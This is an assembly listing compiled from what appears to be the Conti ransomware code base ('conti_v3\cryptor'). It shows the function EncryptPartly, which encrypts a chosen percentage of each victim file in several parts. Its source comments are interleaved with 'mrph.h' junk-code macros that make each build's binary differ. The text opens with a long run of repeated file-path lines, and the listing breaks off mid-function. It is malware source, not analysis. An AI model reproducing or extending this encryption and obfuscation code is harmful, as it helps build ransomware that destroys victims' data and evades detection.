; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z
_TEXT	SEGMENT
_morph_var$1 = 48
_morph_var$2 = 48
_morph_var$3 = 48
_morph_var$4 = 48
_morph_var$5 = 48
_morph_var$6 = 48
_morph_var$7 = 48
_morph_var$8 = 48
_morph_var$9 = 48
_morph_var$10 = 48
_morph_var$11 = 48
_morph_var$12 = 48
_morph_var$13 = 48
_morph_var$14 = 48
_morph_var$15 = 48
_morph_var$16 = 48
_morph_var$17 = 48
_morph_var$18 = 48
_morph_var$19 = 48
_morph_var$20 = 48
_morph_var$21 = 48
_morph_var$22 = 48
_morph_var$23 = 48
_morph_var$24 = 48
_morph_var$25 = 48
_morph_var$26 = 48
_morph_var$27 = 48
_morph_var$28 = 48
_morph_var$29 = 48
_morph_var$30 = 48
_morph_var$31 = 48
StepsCount$1$ = 52
StepSize$1$ = 56
i$1$ = 64
FileInfo$GSCopy$1$ = 72
Buffer$GSCopy$1$ = 80
BytesRead$ = 88
__$ArrayPad$ = 96
FileInfo$ = 176
Buffer$ = 184
CryptoProvider$dead$ = 192
PublicKey$dead$ = 200
DataPercent$ = 208
?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z PROC ; EncryptPartly, COMDAT

; 978  : {

$LN1649:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	41 54		 push	 r12
  00005	41 57		 push	 r15
  00007	48 8d 6c 24 c9	 lea	 rbp, QWORD PTR [rsp-55]
  0000c	48 81 ec 88 00
	00 00		 sub	 rsp, 136		; 00000088H
  00013	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001a	48 33 c4	 xor	 rax, rsp
  0001d	48 89 45 0f	 mov	 QWORD PTR __$ArrayPad$[rbp-81], rax

; 979  : 	BOOL Success = FALSE;
; 980  : 	DWORD BytesRead = 0;
; 981  : 	DWORD BytesToRead = 0;
; 982  : 	DWORD BytesToWrite = 0;
; 983  : 	LONGLONG TotalRead = 0;
; 984  : 	LONGLONG BytesToEncrypt;
; 985  : 	LARGE_INTEGER Offset;
; 986  : 	LONGLONG PartSize = 0;
; 987  : 	LONGLONG StepSize = 0;
; 988  : 	INT StepsCount = 0;
; 989  : 
; 990  : 	switch (DataPercent) {

  00021	0f b6 45 7f	 movzx	 eax, BYTE PTR DataPercent$[rbp-81]
  00025	48 8b f9	 mov	 rdi, rcx
  00028	83 c0 f6	 add	 eax, -10
  0002b	48 89 55 ff	 mov	 QWORD PTR Buffer$GSCopy$1$[rbp-81], rdx
  0002f	48 89 4d f7	 mov	 QWORD PTR FileInfo$GSCopy$1$[rbp-81], rcx
  00033	c7 45 07 00 00
	00 00		 mov	 DWORD PTR BytesRead$[rbp-81], 0
  0003a	83 f8 46	 cmp	 eax, 70			; 00000046H
  0003d	0f 87 00 1c 00
	00		 ja	 $LN20@EncryptPar
  00043	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:__ImageBase
  0004a	48 98		 cdqe
  0004c	0f b6 84 02 00
	00 00 00	 movzx	 eax, BYTE PTR $LN1223@EncryptPar[rdx+rax]
  00054	8b 8c 82 00 00
	00 00		 mov	 ecx, DWORD PTR $LN1224@EncryptPar[rdx+rax*4]
  0005b	48 03 ca	 add	 rcx, rdx
  0005e	ff e1		 jmp	 rcx
$LN9@EncryptPar:

; 992  : 		PartSize = (FileInfo->FileSize / 100) * 4;

  00060	48 8b 4f 10	 mov	 rcx, QWORD PTR [rdi+16]
  00064	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  0006e	48 f7 e9	 imul	 rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00071	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$21[rbp-81], 1547201 ; 00179bc1H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 992  : 		PartSize = (FileInfo->FileSize / 100) * 4;

  00078	4c 8d 3c 11	 lea	 r15, QWORD PTR [rcx+rdx]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0007c	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$21[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 992  : 		PartSize = (FileInfo->FileSize / 100) * 4;

  0007f	49 c1 ff 06	 sar	 r15, 6
  00083	49 8b c7	 mov	 rax, r15
  00086	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  0008a	4c 03 f8	 add	 r15, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0008d	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00092	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 992  : 		PartSize = (FileInfo->FileSize / 100) * 4;

  00094	49 c1 e7 02	 shl	 r15, 2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00098	8b c2		 mov	 eax, edx
  0009a	c1 e8 1f	 shr	 eax, 31
  0009d	03 d0		 add	 edx, eax
  0009f	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000a2	3b c8		 cmp	 ecx, eax
  000a4	74 49		 je	 SHORT $LN253@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  000a6	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$21[rbp-81]
  000a9	83 c1 02	 add	 ecx, 2
  000ac	41 03 cf	 add	 ecx, r15d
  000af	89 4d df	 mov	 DWORD PTR _morph_var$21[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  000b2	8b 45 df	 mov	 eax, DWORD PTR _morph_var$21[rbp-81]
  000b5	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  000ba	7d 07		 jge	 SHORT $LN1222@EncryptPar
  000bc	ff c8		 dec	 eax
  000be	83 c8 fc	 or	 eax, -4
  000c1	ff c0		 inc	 eax
$LN1222@EncryptPar:
  000c3	85 c0		 test	 eax, eax
  000c5	75 79		 jne	 SHORT $LN252@EncryptPar
  000c7	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL245@EncryptPar:
  000d0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$21[rbp-81]
  000d3	ff c0		 inc	 eax
  000d5	89 45 df	 mov	 DWORD PTR _morph_var$21[rbp-81], eax
  000d8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$21[rbp-81]
  000db	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  000e0	7d 07		 jge	 SHORT $LN1221@EncryptPar
  000e2	ff c8		 dec	 eax
  000e4	83 c8 fc	 or	 eax, -4
  000e7	ff c0		 inc	 eax
$LN1221@EncryptPar:
  000e9	85 c0		 test	 eax, eax
  000eb	74 e3		 je	 SHORT $LL245@EncryptPar

; 51   : 	}

  000ed	eb 51		 jmp	 SHORT $LN252@EncryptPar
$LN253@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  000ef	8b 45 df	 mov	 eax, DWORD PTR _morph_var$21[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  000f2	b9 02 00 00 00	 mov	 ecx, 2
  000f7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$21[rbp-81]
  000fa	41 2b cf	 sub	 ecx, r15d
  000fd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000ff	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00104	89 4d df	 mov	 DWORD PTR _morph_var$21[rbp-81], ecx
  00107	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$21[rbp-81]
  0010a	f7 e9		 imul	 ecx
  0010c	8b c2		 mov	 eax, edx
  0010e	c1 e8 1f	 shr	 eax, 31
  00111	03 d0		 add	 edx, eax
  00113	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00116	3b c8		 cmp	 ecx, eax
  00118	75 26		 jne	 SHORT $LN252@EncryptPar
  0011a	66 0f 1f 44 00
	00		 npad	 6
$LL247@EncryptPar:
  00120	8b 45 df	 mov	 eax, DWORD PTR _morph_var$21[rbp-81]
  00123	ff c0		 inc	 eax
  00125	89 45 df	 mov	 DWORD PTR _morph_var$21[rbp-81], eax
  00128	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0012d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$21[rbp-81]
  00130	f7 e9		 imul	 ecx
  00132	8b c2		 mov	 eax, edx
  00134	c1 e8 1f	 shr	 eax, 31
  00137	03 d0		 add	 edx, eax
  00139	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0013c	3b c8		 cmp	 ecx, eax
  0013e	74 e0		 je	 SHORT $LL247@EncryptPar
$LN252@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 995  : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00140	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00144	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  00148	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0014b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$22[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00152	44 8b 45 df	 mov	 r8d, DWORD PTR _morph_var$22[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 995  : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00156	48 99		 cdq
  00158	48 2b c2	 sub	 rax, rdx
  0015b	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  00162	48 d1 f8	 sar	 rax, 1
  00165	4c 8b e0	 mov	 r12, rax
  00168	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0016c	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00171	41 f7 e8	 imul	 r8d
  00174	8b ca		 mov	 ecx, edx
  00176	c1 e9 1f	 shr	 ecx, 31
  00179	03 d1		 add	 edx, ecx
  0017b	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  0017e	44 3b c1	 cmp	 r8d, ecx
  00181	74 4f		 je	 SHORT $LN232@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00183	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$22[rbp-81]
  00186	83 c1 02	 add	 ecx, 2
  00189	41 03 cc	 add	 ecx, r12d
  0018c	89 4d df	 mov	 DWORD PTR _morph_var$22[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0018f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$22[rbp-81]
  00192	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00197	7d 07		 jge	 SHORT $LN1219@EncryptPar
  00199	ff c8		 dec	 eax
  0019b	83 c8 fc	 or	 eax, -4
  0019e	ff c0		 inc	 eax
$LN1219@EncryptPar:
  001a0	85 c0		 test	 eax, eax
  001a2	0f 85 88 12 00
	00		 jne	 $LN378@EncryptPar
  001a8	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL224@EncryptPar:
  001b0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$22[rbp-81]
  001b3	ff c0		 inc	 eax
  001b5	89 45 df	 mov	 DWORD PTR _morph_var$22[rbp-81], eax
  001b8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$22[rbp-81]
  001bb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  001c0	7d 07		 jge	 SHORT $LN1218@EncryptPar
  001c2	ff c8		 dec	 eax
  001c4	83 c8 fc	 or	 eax, -4
  001c7	ff c0		 inc	 eax
$LN1218@EncryptPar:
  001c9	85 c0		 test	 eax, eax
  001cb	74 e3		 je	 SHORT $LL224@EncryptPar

; 51   : 	}

  001cd	e9 5e 12 00 00	 jmp	 $LN378@EncryptPar
$LN232@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  001d2	8b 45 df	 mov	 eax, DWORD PTR _morph_var$22[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  001d5	b9 02 00 00 00	 mov	 ecx, 2
  001da	8b 45 df	 mov	 eax, DWORD PTR _morph_var$22[rbp-81]
  001dd	41 2b cc	 sub	 ecx, r12d
  001e0	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  001e2	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001e7	89 4d df	 mov	 DWORD PTR _morph_var$22[rbp-81], ecx
  001ea	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$22[rbp-81]
  001ed	f7 e9		 imul	 ecx
  001ef	8b c2		 mov	 eax, edx
  001f1	c1 e8 1f	 shr	 eax, 31
  001f4	03 d0		 add	 edx, eax
  001f6	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001f9	3b c8		 cmp	 ecx, eax
  001fb	0f 85 2f 12 00
	00		 jne	 $LN378@EncryptPar
  00201	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL226@EncryptPar:
  00210	8b 45 df	 mov	 eax, DWORD PTR _morph_var$22[rbp-81]
  00213	ff c0		 inc	 eax
  00215	89 45 df	 mov	 DWORD PTR _morph_var$22[rbp-81], eax
  00218	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0021d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$22[rbp-81]
  00220	f7 e9		 imul	 ecx
  00222	8b c2		 mov	 eax, edx
  00224	c1 e8 1f	 shr	 eax, 31
  00227	03 d0		 add	 edx, eax
  00229	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0022c	3b c8		 cmp	 ecx, eax
  0022e	74 e0		 je	 SHORT $LL226@EncryptPar

; 55   : 	}

  00230	e9 fb 11 00 00	 jmp	 $LN378@EncryptPar
$LN10@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1000 : 		PartSize = (FileInfo->FileSize / 100) * 5;

  00235	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  0023f	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  00243	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  00247	48 c1 fa 06	 sar	 rdx, 6
  0024b	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0024e	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$20[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00255	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$20[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1000 : 		PartSize = (FileInfo->FileSize / 100) * 5;

  00258	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  0025c	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0025f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1000 : 		PartSize = (FileInfo->FileSize / 100) * 5;

  00264	4c 8d 3c 92	 lea	 r15, QWORD PTR [rdx+rdx*4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00268	f7 e9		 imul	 ecx
  0026a	8b c2		 mov	 eax, edx
  0026c	c1 e8 1f	 shr	 eax, 31
  0026f	03 d0		 add	 edx, eax
  00271	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00274	3b c8		 cmp	 ecx, eax
  00276	74 47		 je	 SHORT $LN274@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00278	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$20[rbp-81]
  0027b	83 c1 02	 add	 ecx, 2
  0027e	41 03 cf	 add	 ecx, r15d
  00281	89 4d df	 mov	 DWORD PTR _morph_var$20[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00284	8b 45 df	 mov	 eax, DWORD PTR _morph_var$20[rbp-81]
  00287	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0028c	7d 07		 jge	 SHORT $LN1216@EncryptPar
  0028e	ff c8		 dec	 eax
  00290	83 c8 fc	 or	 eax, -4
  00293	ff c0		 inc	 eax
$LN1216@EncryptPar:
  00295	85 c0		 test	 eax, eax
  00297	75 77		 jne	 SHORT $LN273@EncryptPar
  00299	0f 1f 80 00 00
	00 00		 npad	 7
$LL266@EncryptPar:
  002a0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$20[rbp-81]
  002a3	ff c0		 inc	 eax
  002a5	89 45 df	 mov	 DWORD PTR _morph_var$20[rbp-81], eax
  002a8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$20[rbp-81]
  002ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  002b0	7d 07		 jge	 SHORT $LN1215@EncryptPar
  002b2	ff c8		 dec	 eax
  002b4	83 c8 fc	 or	 eax, -4
  002b7	ff c0		 inc	 eax
$LN1215@EncryptPar:
  002b9	85 c0		 test	 eax, eax
  002bb	74 e3		 je	 SHORT $LL266@EncryptPar

; 51   : 	}

  002bd	eb 51		 jmp	 SHORT $LN273@EncryptPar
$LN274@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  002bf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$20[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  002c2	b9 02 00 00 00	 mov	 ecx, 2
  002c7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$20[rbp-81]
  002ca	41 2b cf	 sub	 ecx, r15d
  002cd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  002cf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002d4	89 4d df	 mov	 DWORD PTR _morph_var$20[rbp-81], ecx
